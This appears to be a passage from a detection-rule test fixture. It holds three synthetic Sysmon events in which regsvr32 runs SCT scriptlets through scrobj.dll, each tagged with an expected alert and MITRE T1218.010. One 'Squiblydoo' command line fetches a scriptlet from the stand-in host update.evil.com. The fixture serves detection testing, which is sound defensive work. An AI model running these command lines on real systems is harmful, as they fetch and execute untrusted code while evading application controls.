    {
      "name": "attack regsvr32 08 | local SCT in Temp",
      "event": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Sysmon\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"eventID\":\"1\",\"version\":\"5\",\"level\":\"4\",\"task\":\"1\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2026-08-19T22:09:40.801950284Z\",\"eventRecordID\":\"550097\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"computer\":\"kingslanding.sevenkingdoms.local\",\"severityValue\":\"INFORMATION\"},\"eventdata\":{\"utcTime\":\"2026-08-19 22:09:40.801\",\"processGuid\":\"{ecc063c3-7ddd-9727-5465-000000000029}\",\"processId\":\"4517\",\"image\":\"C:\\\\Windows\\\\System32\\\\regsvr32.exe\",\"commandLine\":\"regsvr32.exe /s C:\\\\Users\\\\Administrator\\\\AppData\\\\Local\\\\Temp\\\\inv.sct scrobj.dll\",\"currentDirectory\":\"C:\\\\Users\\\\Administrator\\\\\",\"user\":\"SEVENKINGDOMS\\\\Administrator\",\"parentProcessGuid\":\"{41c406e3-aa37-7f60-b649-000000000015}\",\"parentProcessId\":\"6145\",\"parentImage\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"parentCommandLine\":\"cmd.exe /c regsvr32.exe /s C:\\\\Users\\\\Administrator\\\\AppData\\\\Local\\\\Temp\\\\inv.sct scrobj.dll\",\"hashes\":\"MD5=44DDC1031DF48CD8F239E2E4500E0532,SHA256=9C334DF855042FE1C23FDAD12B781F3D8774A25885E3DC17C9AB12211925DE67,IMPHASH=76EE5D2AC065D9B18DF13884FF610D46\"}}}",
      "expect": {
        "rule.id": "100804",
        "alert": true
      },
      "category": "attack",
      "attack": "regsvr32",
      "evasion": false,
      "expected_rule_id": 100804,
      "expected_level": 10,
      "mitre_id": "T1218.010"
    },
    {
      "name": "attack regsvr32 09 | Squiblydoo remote SCT evil domain",
      "event": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Sysmon\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"eventID\":\"1\",\"version\":\"5\",\"level\":\"4\",\"task\":\"1\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2026-08-19T22:11:46.057190241Z\",\"eventRecordID\":\"550098\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"computer\":\"kingslanding.sevenkingdoms.local\",\"severityValue\":\"INFORMATION\"},\"eventdata\":{\"utcTime\":\"2026-08-19 22:11:46.057\",\"processGuid\":\"{ecc063c3-7ddd-9727-5465-000000000029}\",\"processId\":\"4517\",\"image\":\"C:\\\\Windows\\\\System32\\\\regsvr32.exe\",\"commandLine\":\"regsvr32.exe /u /i:http://update.evil.com/1.sct scrobj.dll\",\"currentDirectory\":\"C:\\\\Users\\\\Administrator\\\\\",\"user\":\"SEVENKINGDOMS\\\\Administrator\",\"parentProcessGuid\":\"{41c406e3-aa37-7f60-b649-000000000015}\",\"parentProcessId\":\"6145\",\"parentImage\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"parentCommandLine\":\"cmd.exe /c regsvr32.exe /u /i:http://update.evil.com/1.sct scrobj.dll\",\"hashes\":\"MD5=44DDC1031DF48CD8F239E2E4500E0532,SHA256=9C334DF855042FE1C23FDAD12B781F3D8774A25885E3DC17C9AB12211925DE67,IMPHASH=76EE5D2AC065D9B18DF13884FF610D46\"}}}",
      "expect": {
        "rule.id": "100804",
        "alert": true
      },
      "category": "attack",
      "attack": "regsvr32",
      "evasion": false,
      "expected_rule_id": 100804,
      "expected_level": 10,
      "mitre_id": "T1218.010"
    },
    {
      "name": "attack regsvr32 10 | local SCT second Public",
      "event": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Sysmon\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"eventID\":\"1\",\"version\":\"5\",\"level\":\"4\",\"task\":\"1\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2026-08-19T22:12:24.072987464Z\",\"eventRecordID\":\"550099\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"computer\":\"kingslanding.sevenkingdoms.local\",\"severityValue\":\"INFORMATION\"},\"eventdata\":{\"utcTime\":\"2026-08-19 22:12:24.072\",\"processGuid\":\"{ecc063c3-7ddd-9727-5465-000000000029}\",\"processId\":\"4517\",\"image\":\"C:\\\\Windows\\\\System32\\\\regsvr32.exe\",\"commandLine\":\"regsvr32.exe /s /n /i:C:\\\\Users\\\\Public\\\\2.sct scrobj.dll\",\"currentDirectory\":\"C:\\\\Users\\\\Administrator\\\\\",\"user\":\"SEVENKINGDOMS\\\\Administrator\",\"parentProcessGuid\":\"{41c406e3-aa37-7f60-b649-000000000015}\",\"parentProcessId\":\"6145\",\"parentImage\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"parentCommandLine\":\"cmd.exe /c regsvr32.exe /s /n /i:C:\\\\Users\\\\Public\\\\2.sct scrobj.dll\",\"hashes\":\"MD5=44DDC1031DF48CD8F239E2E4500E0532,SHA256=9C334DF855042FE1C23FDAD12B781F3D8774A25885E3DC17C9AB12211925DE67,IMPHASH=76EE5D2AC065D9B18DF13884FF610D46\"}}}",
      "expect": {
        "rule.id": "100804",
        "alert": true
      },
      "category": "attack",
      "attack": "regsvr32",
      "evasion": false,
      "expected_rule_id": 100804,
      "expected_level": 10,
      "mitre_id": "T1218.010"
    }
  ]
}
